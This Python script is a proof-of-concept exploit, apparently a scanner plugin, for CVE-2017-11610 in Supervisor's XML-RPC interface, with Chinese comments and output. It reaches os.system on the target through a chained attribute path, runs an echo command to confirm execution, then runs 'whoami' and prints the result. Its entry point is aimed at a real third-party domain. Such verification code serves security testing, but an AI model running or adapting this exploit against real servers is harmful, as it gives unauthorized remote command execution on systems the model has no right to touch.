#!/usr/bin/env python3

'''
name: CVE-2017-11610 任意代码执行漏洞
description: CVE-2017-11610 任意代码执行漏洞
'''

import json
import xmlrpc.client
from app.lib.utils.common import get_capta

class CVE_2017_11610_BaseVerify:
    def __init__(self, url):
        self.url = url
        self.capta = get_capta()

    def run(self):
        try:
            with xmlrpc.client.ServerProxy(self.url) as proxy:
                old = getattr(proxy, 'supervisor.readLog')(0,0)
                logfile = getattr(proxy, 'supervisor.supervisord.options.logfile.strip')()
                getattr(proxy, 'supervisor.supervisord.options.warnings.linecache.os.system')('{} | tee -a {}'.format('echo ' + self.capta, logfile))
                result = getattr(proxy, 'supervisor.readLog')(0,0)
                if self.capta in result[len(old):]:
                    getattr(proxy, 'supervisor.supervisord.options.warnings.linecache.os.system')('{} | tee -a {}'.format('whoami', logfile))
                    cmd_result = getattr(proxy, 'supervisor.readLog')(0,0).split('\n')[-2]
                    print("存在CVE-2017-11610任意代码执行漏洞,执行whoami命令结果是:", cmd_result)
                    return True
                else:
                    print("不存在CVE-2017-11610任意代码执行漏洞")
                    return False
        except Exception as e:
            print(e)
            return False
        finally:
            pass

if __name__ == "__main__":
    CVE_2017_11610 = CVE_2017_11610_BaseVerify("http://baidu.com")
    CVE_2017_11610.run()
